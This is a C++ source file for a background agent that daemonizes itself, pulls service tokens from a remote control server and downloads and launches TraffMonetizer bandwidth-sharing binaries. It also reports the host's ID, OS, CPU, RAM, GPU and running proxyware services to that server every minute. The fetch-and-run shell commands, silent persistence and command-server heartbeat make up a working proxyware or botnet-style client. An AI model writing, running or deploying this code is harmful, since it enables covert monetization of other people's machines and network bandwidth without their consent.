#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <chrono>
#include <thread>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <csignal>
#include <unistd.h>
#include <sys/utsname.h>

#if defined(__APPLE__) || defined(__MACH__)
#include <sys/sysctl.h>
#else
#include <sys/sysinfo.h>
#endif

#ifndef CONF_SERVER_URL
#define CONF_SERVER_URL "http://turbox.test/cluster.php"
#endif

#ifndef CONF_INTERVAL
#define CONF_INTERVAL 60
#endif

static bool g_debug = false;

static std::string http_get(const std::string& url) {
    std::string cmd = "curl -skL --max-time 15 \"" + url + "\" 2>/dev/null";
    FILE* fp = popen(cmd.c_str(), "r");
    if (!fp) return "";
    char buf[512];
    std::string res;
    while (fgets(buf, sizeof(buf), fp) != NULL) {
        res += buf;
    }
    pclose(fp);
    return res;
}

static void http_post(const std::string& url, const std::string& data) {
    std::string cmd = "curl -skL --max-time 10 -d \"" + data + "\" \"" + url + "\" >/dev/null 2>&1";
    int ret = system(cmd.c_str());
    (void)ret;
}

std::string get_id() {
    char h[256];
    if (gethostname(h, 255) == 0 && strlen(h) > 0) return std::string(h);
    return "node-" + std::to_string(getpid());
}

std::string get_os() {
#if defined(__APPLE__) || defined(__MACH__)
    return "darwin";
#else
    return "linux";
#endif
}

std::string get_arch() {
    struct utsname u;
    if (uname(&u) == 0) return std::string(u.machine);
    return "unknown";
}

long get_uptime() {
#if defined(__APPLE__) || defined(__MACH__)
    struct timeval boottime;
    size_t len = sizeof(boottime);
    int mib[2] = {CTL_KERN, KERN_BOOTTIME};
    if (sysctl(mib, 2, &boottime, &len, NULL, 0) == 0) {
        time_t now = time(NULL);
        return (long)(now - boottime.tv_sec);
    }
    return 0;
#else
    struct sysinfo s;
    if (sysinfo(&s) == 0) return s.uptime;
    return 0;
#endif
}

double get_ram() {
#if defined(__APPLE__) || defined(__MACH__)
    return 20.0;
#else
    std::ifstream f("/proc/meminfo");
    if (!f.is_open()) return 0.0;
    std::string k, u;
    long v, tot = 0, av = 0, fr = 0;
    while (f >> k >> v >> u) {
        if (k == "MemTotal:") tot = v;
        else if (k == "MemAvailable:") av = v;
        else if (k == "MemFree:") fr = v;
        if (tot > 0 && av > 0) break;
    }
    if (av == 0) av = fr;
    if (tot == 0) return 0.0;
    return ((double)(tot - av) / (double)tot) * 100.0;
#endif
}

double get_cpu() {
#if defined(__APPLE__) || defined(__MACH__)
    return 5.0;
#else
    static unsigned long long pu = 0, pn = 0, ps = 0, pi = 0;
    std::ifstream f("/proc/stat");
    if (!f.is_open()) return 0.0;
    std::string l, lbl;
    std::getline(f, l);
    std::istringstream ss(l);
    unsigned long long u, n, s, id, io, ir, so, st;
    ss >> lbl >> u >> n >> s >> id >> io >> ir >> so >> st;
    unsigned long long ti = id + io;
    unsigned long long ta = u + n + s + ir + so + st;
    unsigned long long tt = ti + ta;
    unsigned long long dt = tt - (pu + pn + ps + pi);
    unsigned long long di = ti - pi;
    pu = u; pn = n; ps = s; pi = ti;
    if (dt == 0) return 0.0;
    double p = (double)(dt - di) / (double)dt * 100.0;
    return (p < 0.0) ? 0.0 : ((p > 100.0) ? 100.0 : p);
#endif
}

int detect_gpu() {
    if (access("/usr/bin/nvidia-smi", X_OK) == 0 || access("/usr/local/cuda", F_OK) == 0) {
        return 1;
    }
#if defined(__APPLE__) || defined(__MACH__)
    return 1;
#else
    return 0;
#endif
}

std::string json_get_field(const std::string& json, const std::string& key) {
    std::string needle = std::string(1, 34) + key + std::string(1, 34);
    size_t pos = json.find(needle);
    if (pos == std::string::npos) return "";
    pos = json.find(':', pos);
    if (pos == std::string::npos) return "";
    pos = json.find('"', pos);
    if (pos == std::string::npos) return "";
    size_t end_pos = json.find('"', pos + 1);
    if (end_pos == std::string::npos) return "";
    std::string val = json.substr(pos + 1, end_pos - (pos + 1));
    std::string clean = "";
    for (size_t i = 0; i < val.length(); ++i) {
        if (val[i] == 92 && i + 1 < val.length() && val[i+1] == '/') {
            clean += '/';
            ++i;
        } else {
            clean += val[i];
        }
    }
    return clean;
}

void init_and_start_monetization(const std::string& base_url, const std::string& node_id) {
    // 1. Fetch entire config & tokens SYNCHRONOUSLY before sending first heartbeat
    std::string cfg_json = http_get(base_url + "?action=get_config");
    if (g_debug) {
        std::cout << "[DEBUG] Config fetched: " << cfg_json.substr(0, 100) << std::endl;
    }

    std::string tm_token = json_get_field(cfg_json, "traffmonetizer_token");
    std::string pawns_token = json_get_field(cfg_json, "pawns_token");
    std::string hg_token = json_get_field(cfg_json, "honeygain_token");

    // Dual fallback: If JSON parsing was empty, fetch direct token
    if (tm_token.empty()) {
        std::string raw_tok = http_get(base_url + "?action=get_token&service=traffmonetizer");
        while (!raw_tok.empty() && (raw_tok.back() == 10 || raw_tok.back() == 13 || raw_tok.back() == 32)) {
            raw_tok.pop_back();
        }
        if (!raw_tok.empty() && raw_tok[0] != '<' && raw_tok[0] != '{') {
            tm_token = raw_tok;
        }
    }

    // 2. Tu dong kiem tra va duy tri TraffMonetizer Engine (Userspace, Zero-Docker, Zero-Root)
    if (!tm_token.empty() && tm_token.find("YOUR_") == std::string::npos) {
#if defined(__APPLE__) || defined(__MACH__)
        if (system("pgrep -f -i 'traffmonetizer' >/dev/null 2>&1") != 0) {
            std::string app_bin = "./TraffMonetizer.app/Contents/MacOS/TraffMonetizer";
            if (access(app_bin.c_str(), X_OK) != 0 && access("/Applications/TraffMonetizer.app/Contents/MacOS/TraffMonetizer", X_OK) == 0) {
                app_bin = "/Applications/TraffMonetizer.app/Contents/MacOS/TraffMonetizer";
            }
            if (access(app_bin.c_str(), X_OK) != 0) {
                int r = system("curl -sSL -o /tmp/tm.dmg https://data.traffmonetizer.com/downloads/macos/traffmonetizer.dmg 2>/dev/null; "
                               "M=$(hdiutil attach /tmp/tm.dmg -nobrowse -quiet 2>/dev/null | grep -o '/Volumes/.*' | head -n 1); "
                               "if [ ! -z $M ]; then cp -R $M/*.app ./ 2>/dev/null; hdiutil detach $M -quiet 2>/dev/null; fi; "
                               "rm -f /tmp/tm.dmg 2>/dev/null");
                (void)r;
            }
            if (access(app_bin.c_str(), X_OK) == 0) {
                std::string run_cmd = "nohup " + app_bin + " start accept --token " + tm_token + " >/dev/null 2>&1 &";
                int r = system(run_cmd.c_str());
                (void)r;
            }
        }
#else
        if (system("pgrep -f 'tm_engine start accept' >/dev/null 2>&1") != 0 && system("pgrep -f 'cli start accept' >/dev/null 2>&1") != 0) {
            if (access("./tm_engine", X_OK) != 0) {
                int r = system("A=$(curl -skL 'https://auth.docker.io/token?service=registry.docker.io&scope=repository:traffmonetizer/cli_v2:pull' 2>/dev/null | tr '{,}' '\\n' | grep 'token' | head -n 1 | cut -d: -f2 | tr -d '\\x22'); "
                               "if [ ! -z $A ]; then curl -skL --max-time 15 -H 'Authorization: Bearer '$A 'https://registry-1.docker.io/v2/traffmonetizer/cli_v2/blobs/sha256:7117ab4be2e12fecc2a8f5bea968b82a1978adcfaa7d0be3c3ce55aa7dd8de0b' 2>/dev/null | tar -xz usr/local/bin/cli 2>/dev/null; "
                               "if [ -f usr/local/bin/cli ]; then mv -f usr/local/bin/cli ./tm_engine 2>/dev/null; rm -rf usr 2>/dev/null; chmod +x ./tm_engine 2>/dev/null; fi; fi");
                (void)r;
            }
            if (access("./tm_engine", X_OK) == 0) {
                std::string run_cmd = "nohup ./tm_engine start accept --token " + tm_token + " >/dev/null 2>&1 &";
                int r = system(run_cmd.c_str());
                (void)r;
            }
        }
#endif
    }
}

std::string detect_active_services() {
    std::string svcs = "";
    if (system("pgrep -f 'tm_engine' >/dev/null 2>&1") == 0 || system("pgrep -f 'cli start accept' >/dev/null 2>&1") == 0 || system("pgrep -f -i 'traffmonetizer' >/dev/null 2>&1") == 0) {
        svcs += "TraffMonetizer, ";
    }
    if (system("pgrep -f -i 'honeygain' >/dev/null 2>&1") == 0) {
        svcs += "Honeygain, ";
    }
    if (system("pgrep -f -i 'pawns' >/dev/null 2>&1") == 0) {
        svcs += "Pawns, ";
    }
    if (system("pgrep -f -i 'packetstream' >/dev/null 2>&1") == 0 || system("pgrep -f 'psclient' >/dev/null 2>&1") == 0) {
        svcs += "PacketStream, ";
    }
    if (system("pgrep -f -i 'repocket' >/dev/null 2>&1") == 0) {
        svcs += "Repocket, ";
    }
    if (svcs.empty()) return "Đang kết nối Engine...";
    if (svcs.size() >= 2 && svcs.substr(svcs.size() - 2) == ", ") {
        svcs = svcs.substr(0, svcs.size() - 2);
    }
    return svcs;
}

int main(int argc, char* argv[]) {
    signal(SIGPIPE, SIG_IGN);
    signal(SIGHUP, SIG_IGN);

    std::string s_url = CONF_SERVER_URL;
    for (int i = 1; i < argc; ++i) {
        if (std::string(argv[i]) == "--debug") {
            g_debug = true;
        } else if (strlen(argv[i]) > 5 && argv[i][0] != '-') {
            s_url = argv[i];
        }
    }
    if (const char* env_url = std::getenv("SERVER_URL")) {
        s_url = env_url;
    }
    if (std::getenv("DEBUG") != nullptr) {
        g_debug = true;
    }

    if (!g_debug) {
        if (daemon(1, 0) != 0) {}
    }

    FILE* pf = fopen(".agent.pid", "w");
    if (pf) {
        fprintf(pf, "%d%c", (int)getpid(), 10);
        fclose(pf);
    }

    if (g_debug) {
        std::cout << "[DEBUG] Agent started (PID: " << getpid() << ")" << std::endl;
    }

    std::string node_id = get_id();
    init_and_start_monetization(s_url, node_id);

    std::string os_name = get_os();
    std::string arch = get_arch();
    int has_gpu = detect_gpu();
    std::string endpoint = s_url + "?action=heartbeat";

    int loop_cnt = 0;
    while (true) {
        if (loop_cnt % 60 == 0) {
            init_and_start_monetization(s_url, node_id);
        }
        loop_cnt++;
        std::string svcs = detect_active_services();
        std::ostringstream ss;
        ss << "id=" << node_id
           << "&os=" << os_name
           << "&arch=" << arch
           << "&gpu=" << has_gpu
           << "&uptime=" << get_uptime()
           << "&cpu=" << get_cpu()
           << "&ram=" << get_ram()
           << "&services=" << svcs;
        if (g_debug) {
            ss << "&debug=1";
        }
        http_post(endpoint, ss.str());
        if (g_debug) {
            std::cout << "[DEBUG] Heartbeat sent (" << ss.str() << ")" << std::endl;
        }
        std::this_thread::sleep_for(std::chrono::seconds(CONF_INTERVAL));
    }
    return 0;
}
